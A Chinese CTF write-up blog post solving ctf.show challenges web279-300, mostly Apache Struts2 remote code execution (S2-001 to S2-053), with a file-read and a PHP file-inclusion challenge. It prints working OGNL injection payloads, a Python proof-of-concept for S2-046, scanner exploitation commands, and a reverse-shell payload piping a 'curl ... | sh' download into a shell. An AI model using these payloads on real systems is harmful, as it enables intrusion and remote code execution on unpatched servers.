---
title: Web入门_java
author: Creexile
date: 2024-09-21 21:48:45
lastMod: 2025-04-10
summary: 'web279-300'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, Java, 代码审计, 漏洞利用, CTF]
---

# java

---

> 提示: 平台似乎有过滤, 所以提示其实是`echo $FLAG`, 直接执行这个可能就能输出flag; 但是不是很稳定, 如果不行还是使用`env`
>
> 给出的payload都没有经过编码, 可能需要自己编码
>
> 说是java, 其实是struts2漏洞合集吧, 主要不是做题的, 其实是学代码审计的

## web279

- 描述: echo FLAG

只有跳转链接(戳那个where is flag), 查看源码看到提示(?)S2-001, 这是一个struts2漏洞

[Vulhub漏洞系列：struts2漏洞 S2-001](https://www.freebuf.com/column/224041.html), [vulhub漏洞库\_struts2](https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md)

已经是非常详细了, 漏洞也非常的简单

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

# 很急, 找了半天找不到flag于是输出环境变量, 有了
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

## web280

- 描述: echo FLAG 即可

查源码, 点击跳转发现提示是S2-005

参考资料: [Struts2-005漏洞分析(CVE-2010-1870)](https://zhuanlan.zhihu.com/p/701942652), [Struts2-005远程代码执行漏洞分析](https://www.freebuf.com/vuls/193078.html)

> payload不好用

拉倒了, 不如直接去下载一个现成的脚本跑

[Struts2Scan](https://github.com/Vancomycin-g/Struts2Scan), 可以用py也可以直接打开jar文件(那是一个程序)扫描

```bash
python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action
# 利用方式如下, 再输入env即可
python3 .\Struts2Scan.py -u  https://7bb5c5c0-b262-40d3-8ee0-e1d47d58ed14.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --exec
```

![image-20240920221137757](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240920221137757.png)

## web281

- 描述: echo FLAG

点击跳转发现url提示是S2-007, 而且能提交的数据不是username和password而是name, age和email; 参数不对肯定扫不出来, 我们设置一下

```bash
python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -d name=1&&email=1&&age=1
# 利用如下, 同样输入env
python3 .\Struts2Scan.py -u https://208910ad-e478-4dd1-a1f8-83459a38ca57.challenge.ctf.show/S2-007/user.action -n S2-016 --exec
```

结果扫出来是S2-016, 不是很懂反正能用就行

![image-20240921144747121](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921144747121.png)

然后去找了S2-007的漏洞, [vulhub漏洞库\_s2-007](https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md), 在age处输入, 回显也在age处

payload:

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '
```

## web282

- 描述: echo FLAG

跳转后url提示是S2-008, 可以从`./cookie.jsp`或者`./devmode.jsp`入手

如果要获得flag, 直接用扫描工具访问并扫描这两个网址就可以了, 详细信息请看[vulhub漏洞库\_s2-008](https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md)

## web283

- 描述: Struts2 showcase远程代码执行漏洞

`CVE-2013-1965`?, 你不是[s2-009](https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md)?

访问下面的url地址就能读取到env

```
/S2-009/ajax/example5?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

## web284

- 描述: 无

提示为s2-012, 网址我就不放了, 你直接在github打开呗

payload如下, 直接塞进那个框然后抓包即可

> 这何尝不是另一种脚本小子

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![image-20240921153131317](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921153131317.png)

## web285

- 描述: 无

提示s2-013; Try add some parameters in URL

s2-013poc如下:

```
/S2-013/link.action?a=${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('env').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

## web286

- 描述: 无

提示: s2-015

我尝试了可以用的payload, 但是显示env不全, FLAG没出来

```
/S2-015/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()),#q}.action
```

![image-20240921163506207](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921163506207.png)

还是用工具快:

```bash
python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action
# 扫出来三个, 随便用一个得了
python3 .\Struts2Scan.py -u https://660ecde4-19ff-49d8-8a3b-f77b26e45bbd.challenge.ctf.show/S2-015/welcome.action -n S2-016 --exec
```

## web287

- 描述: 无

提示: s6-016; Use "action:", "redirect:", "redirectAction:" in ./default.action

```
/S2-016/default.action?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("env").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
```

![image-20240921164428208](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921164428208.png)

## web288

- 描述: 无

提示: S2-019

复现是s2-008, 甚至poc都差不多

```
?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27env%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A
```

## web289

- 描述: 无

提示: S2-029; add "message" param in url

出问题了, 找了好几个payload用不了, 那就用工具吧

```bash
python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/
# 利用
python3 .\Struts2Scan.py -u https://3e2cec0b-d431-4809-b4f9-82e49c17f631.challenge.ctf.show/S2-029/ -n S2-045 --exec
```

## web290

- 描述: 无

提示: s2-032

打开一个界面, 直接套用github上的payload

```
/S2-032/memoshow.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=env
```

## web291

- 描述: 无

提示: s2-033, 其实是是`s2-045`, 或者`s2-037`, 直接搜索"struts2 /orders/3"就能找到

给个找到的例子, 进去直接搜索/orders/3: https://developer.aliyun.com/article/1160444

```
/S2-033/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=env
```

## web292

- 描述: 无

`S2-037`

```
http://837cc0c1-04ff-4c2f-bbf5-4c4b172436b6.challenge.ctf.show/S2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=env
```

## web293

- 描述: 无

`S2-045`, 看github, 塞在Content-Type发出去

```
"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

## web294

- 描述: 无

`S2-046`, [找到的博客](https://xz.aliyun.com/t/221?time__1311=eqIx0DyGG%3DemqGKDtD%2FQnx4YuRa%2BzDcDhoD)

这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中, 但是你说的对, python真好用

```python
#!/usr/bin/env python
# encoding:utf-8
import requests
class Sugarcrm():
    def poctest(self):
        boundary="---------------------------735323031399963166993862150"
        paylaod="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        url = 'http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action'
        headers = {'Content-Type': 'multipart/form-data; boundary='+boundary+''}
        data ="--"+boundary+"\r\nContent-Disposition: form-data; name=\"foo\"; filename=\""+paylaod+"\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--"+boundary+"--"
        rs=requests.post(url, headers=headers,data=data)
        print(rs.text)

if __name__ == '__main__':
    test = Sugarcrm()
    test.poctest()
```

## web295

- 描述: 无

`S2-048`, 直接看github有更详细的步骤

报错界面上那个Message爆出来的number后面就是flag

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())).(#q)}
```

## web296

- 描述: 无

`s2-052`, 没成功, 用工具跑完了, 指令执行py文件的时候扫不出来, 但是用图形化的又可以

而且用的还是不是s2-052, 用的s2-045

```
python3 .\Struts2Scan.py -u https://a156802e-1b87-421a-bc6d-afff49ad14f7.challenge.ctf.show/S2-052/ -n S2-045 --exec
```

## web297

- 描述: 无

`s2-053`, 详情见github相关界面

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo $FLAG').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

反弹shell(我没成功, 而且不知道为什么)

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl https://your-shell.com/ip:port | sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

## web298

- 描述: 看看代码，了解下和php不一样的地方

[反编译工具](https://github.com/java-decompiler/jd-gui), 直接将war包拖进去就可以用了

从`web.xml`可以找到登录判定文件`logonServlet.class`, 再找到`getVipStatus`, 里面有账号密码:

```java
  public boolean getVipStatus() {
    if (this.username.equals("admin") && this.password.equals("ctfshow"))
      return true;
    return false;
  }
```

找到`/login`了, 可是访问还是404; 结果发现在`/ctfshow/login`

最终url如下, 登录即可获取flag

```
/ctfshow/login?username=admin&password=ctfshow
```

## web299

- 描述: 了解为主

打开, 在源码里面发现``/view-source?file=index.php `, 可以读取文件

先试试读取`/view-source?file=/WEB-INF/web.xml`

```
This is the description of my J2EE component This is the display name of my J2EE component ViewSourceServlet com.ctfshow.servlet.ViewSourceServlet This is the description of my J2EE component This is the display name of my J2EE component GetFlag com.ctfshow.servlet.GetFlag ViewSourceServlet /view-source GetFlag /getFlag index.jsp
```

`com/ctfshow/servlet/GetFlag`下, 结合常见的文件框架, 那就是`/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class`

![image-20240921212805005](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921212805005.png)

有个`/fl3g`, 反正什么都试试

## web300

- 描述: java 告一段落

你这是真的java还是假的java?

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

文件包含?其实就是web299翻版, 直接照着web299走, 换个网址就行了; payload如下:

```
/?file=../../../../../f1bg
```
